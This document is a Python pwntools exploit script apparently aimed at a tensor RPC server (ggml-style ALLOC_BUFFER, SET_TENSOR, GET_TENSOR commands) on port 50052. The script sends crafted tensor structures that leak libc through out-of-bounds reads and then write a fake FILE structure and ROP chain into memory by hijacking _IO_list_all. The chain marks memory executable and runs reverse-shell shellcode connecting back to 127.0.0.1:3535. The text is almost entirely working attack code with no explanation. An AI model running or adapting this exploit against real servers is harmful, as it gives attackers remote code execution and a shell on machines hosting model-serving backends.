from pwn import *

ALLOC_BUFFER = 0
GET_ALIGNMENT = 1
GET_MAX_SIZE = 2
BUFFER_GET_BASE = 3
FREE_BUFFER = 4
BUFFER_CLEAR = 5
SET_TENSOR = 6
GET_TENSOR = 7
COPY_TENSOR = 8
GRAPH_COMPUTE = 9
GET_DEVICE_MEMORY = 10

context(arch='amd64')

p = remote("127.0.0.1",50052)
pd = b''
cmd = p8(GET_DEVICE_MEMORY)
content = b''
input_size = p64(len(content))
pd+= cmd + input_size + content
p.send(pd)
recv = p.recvall(timeout=1)
p.close()


p = remote("127.0.0.1",50052)

pd = b''
cmd = p8(GET_ALIGNMENT)
content = b''
input_size = p64(len(content))
pd+= cmd + input_size + content

cmd = p8(ALLOC_BUFFER)
content = p64(0x100)
input_size = p64(len(content))
pd+= cmd + input_size + content
p.send(pd)
recv = p.recvall(timeout=1)
remote_ptr = u64(recv[0x18:0x20])
sz = u64(recv[0x20:0x28])
log.success(f"remote_ptr:{hex(remote_ptr)},size:{sz}")
p.recvall(timeout=1)
p.close()


next_ptr = remote_ptr + sz - 0x90
log.success(f'next_ptr:{hex(next_ptr)}')


p = remote("127.0.0.1",50052)
cmd = p8(ALLOC_BUFFER)
content = p64(0x100)
input_size = p64(len(content))
pd = cmd + input_size + content
leak_address = remote_ptr + 0x90
rpc_tensor_pd = flat(
    {
        0: [
            0x1,  # id
            p32(2),  # type
            p64(next_ptr),  # buffer
            [  # ne
                p32(0xdeadbeef),
                p32(0xdeadbeef),
                p32(0xdeadbeef),
                p32(0xdeadbeef),
            ],
            [  # nb
                p32(1),
                p32(1),
                p32(1),
                p32(1),
            ],
            p32(0),  # op
            [p32(0)] * 16,  # op_params (corrected from 8 to 16)
            p32(0),  # flags
            [p64(0)] * 10,  # src
            p64(0),  # view_src
            p64(0),  # view_offs
            p64(leak_address),  # data
            'a' * 64,  # name
            'x' * 4  # padding
        ],
    }
)
cmd = p8(GET_TENSOR)
content = flat(
    {
        0: rpc_tensor_pd + p64(0) + p64(0x100)
    }
)
input_size = p64(len(content))
pd+= cmd + input_size + content

p.send(pd)
p.recv(0x18)
leak_libc = u64(p.recv(0x10)[-8:])
lb = leak_libc - 0x6bb1f0
log.success(f"From {hex(remote_ptr)} leak a data:{hex(leak_libc)}")
log.success(f"libc_base:{hex(lb)}")
p.close()

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
libc.address = lb
fake_fp = libc.sym._IO_2_1_stdout_ + 0x100*2
'''
   0x00007ffff796a06a <+26>:	mov    rbp,QWORD PTR [rdi+0x48]
   0x00007ffff796a06e <+30>:	mov    rax,QWORD PTR [rbp+0x18]
   0x00007ffff796a072 <+34>:	lea    r13,[rbp+0x10]
   0x00007ffff796a076 <+38>:	mov    DWORD PTR [rbp+0x10],0x0
   0x00007ffff796a07d <+45>:	mov    rdi,r13
   0x00007ffff796a080 <+48>:	call   QWORD PTR [rax+0x28]
'''
gg = lb + 0x16a050 + 26
nop_gg = libc.search(asm("pop rdx; pop r12; ret")).__next__()
pop_rdi = libc.search(asm("pop rdi;ret")).__next__()
pop_rsi = libc.search(asm("pop rsi;ret")).__next__()
pop_rdx_rbx = libc.search(asm("pop rdx ; pop rbx ; ret")).__next__()
pop_rax = libc.search(asm("pop rax;ret")).__next__()
syscall = libc.search(asm("syscall;ret")).__next__()

sc = asm(shellcraft.connect('127.0.0.1', 3535, 'ipv4') + shellcraft.dupsh()) 
payload = flat(
	{
		0x18:1,
		0x20:0,
		0x28:1,
		0x30:0,
		0x38:gg,
		0x48:fake_fp+0xe8,
		0x50:1,	
		0xd8:lb+0x2170c0+0x300+0x20,
		0xe0:fake_fp,
        0xe8:{
            0x08:nop_gg,
            0x18:fake_fp+0xe8,  #
            0x20:nop_gg,
            0x28:libc.search(asm("leave;ret")).__next__(),
            0x20+0x18:nop_gg,
            0x48:fake_fp+0xe8,  #rbp
            0x48+0x8:[
                pop_rdi,
                (fake_fp&~(0xfff)),
                pop_rsi,
                0x3000,
                pop_rdx_rbx,
                7,0,
                pop_rax,
                10,
                syscall,
                fake_fp+0xe8+0xd0
            ],  
            0xd0:sc
        }
	},filler = '\x00'
)

next_ptr = remote_ptr

p = remote("127.0.0.1",50052)
cmd = p8(ALLOC_BUFFER)
content = p64(0x100)
input_size = p64(len(content))
pd = cmd + input_size + content

rpc_tensor_pd = flat(
    {
        0: [
            0x1,  # id
            p32(2),  # type
            p64(next_ptr),  # buffer
            [  # ne
                p32(0xdeadbeef),
                p32(0xdeadbeef),
                p32(0xdeadbeef),
                p32(0xdeadbeef),
            ],
            [  # nb
                p32(1),
                p32(1),
                p32(1),
                p32(1),
            ],
            p32(0),  # op
            [p32(0)] * 16,  # op_params (corrected from 8 to 16)
            p32(0),  # flags
            [p64(0)] * 10,  # src
            p64(0),  # view_src
            p64(0),  # view_offs
            p64(fake_fp-0x8),  # data
            'a' * 64,  # name
            'x' * 4  # padding
        ],
    }
)


cmd = p8(SET_TENSOR)


content = flat(
    {
        0: [rpc_tensor_pd + p64(0) + p64(0x100),
            payload]
    }
)
input_size = p64(len(content))
pd+= cmd + input_size + content
p.send(pd)
p.recvall(timeout=1)
log.success(f"next_ptr:{hex(next_ptr)}")
log.success(f"write data to {hex(fake_fp)}")
p.close()


next_ptr = remote_ptr + 0x90
ctx = next_ptr - 0x70
p = remote("127.0.0.1",50052)
cmd = p8(ALLOC_BUFFER)
content = p64(0x100)
input_size = p64(len(content))
pd = cmd + input_size + content


rpc_tensor_pd = flat(
    {
        0: [
            0x1,  # id
            p32(2),  # type
            p64(next_ptr),  # buffer
            [  # ne
                p32(0xdeadbeef),
                p32(0xdeadbeef),
                p32(0xdeadbeef),
                p32(0xdeadbeef),
            ],
            [  # nb
                p32(1),
                p32(1),
                p32(1),
                p32(1),
            ],
            p32(0),  # op
            [p32(0)] * 16,  # op_params (corrected from 8 to 16)
            p32(0),  # flags
            [p64(0)] * 10,  # src
            p64(0),  # view_src
            p64(0),  # view_offs
            p64(libc.sym._IO_list_all-0x8),  # data
            'a' * 64,  # name
            'x' * 4  # padding
        ],
    }
)


cmd = p8(SET_TENSOR)
content = flat(
    {
        0: [rpc_tensor_pd + p64(0) + p64(8),
            fake_fp]
    }
)
input_size = p64(len(content))
pd+= cmd + input_size + content



rpc_tensor_pd = flat(
    {
        0: [
            0x1,  # id
            p32(2),  # type
            p64(next_ptr),  # buffer
            [  # ne
                p32(0xdeadbeef),
                p32(0xdeadbeef),
                p32(0xdeadbeef),
                p32(0xdeadbeef),
            ],
            [  # nb
                p32(1),
                p32(1),
                p32(1),
                p32(1),
            ],
            p32(0),  # op
            [p32(0)] * 16,  # op_params (corrected from 8 to 16)
            p32(0),  # flags
            [p64(0)] * 10,  # src
            p64(0),  # view_src
            p64(0),  # view_offs
            p64(0x21a098+lb-8),  # data
            'a' * 64,  # name
            'x' * 4  # padding
        ],
    }
)


cmd = p8(SET_TENSOR)
content = flat(
    {
        0: [rpc_tensor_pd + p64(0) + p64(8),
            libc.sym.exit]
    }
)
input_size = p64(len(content))
pd+= cmd + input_size + content
p.send(pd)
p.recvall(timeout=1)

p.close()